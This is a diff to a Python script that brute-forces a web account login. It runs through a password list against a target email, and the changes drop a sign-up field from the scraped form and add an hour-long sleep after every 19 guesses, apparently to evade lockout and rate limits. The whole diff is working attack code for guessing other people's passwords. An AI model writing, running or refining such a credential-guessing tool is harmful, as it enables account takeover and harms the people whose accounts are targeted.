@@ -92,6 +92,8 @@ def create_form():
         if elem.has_attr("value") and elem.has_attr("name")
         )
     data["login"] = "Log in"
+    if "sign_up" in data:
+        del(data["sign_up"])
     return data, action_url
 
 
@@ -150,6 +152,7 @@ if __name__ == "__main__":
       sys.exit(1)
     print('\033[1;92m[+] Passwords Number {}'.format(str(len(password_data))))
     print(65 * '\033[1;92m=')
+    try_number=0
     for index, password in zip(range(password_data.__len__()), password_data):
         password = password.strip()
         if len(password) < MIN_PASSWORD_LENGTH:
@@ -157,3 +160,8 @@ if __name__ == "__main__":
         print("\033[1;92mTrying password [ "+str(index)+" ]: \033[1;97m"+str(password))
         if na_hack_naba(email,password):
           break
+        try_number+=1
+        if try_number==19:
+            print("\033[1;91m Sleep in one hour")
+            time.sleep(3600)
+            try_number=0
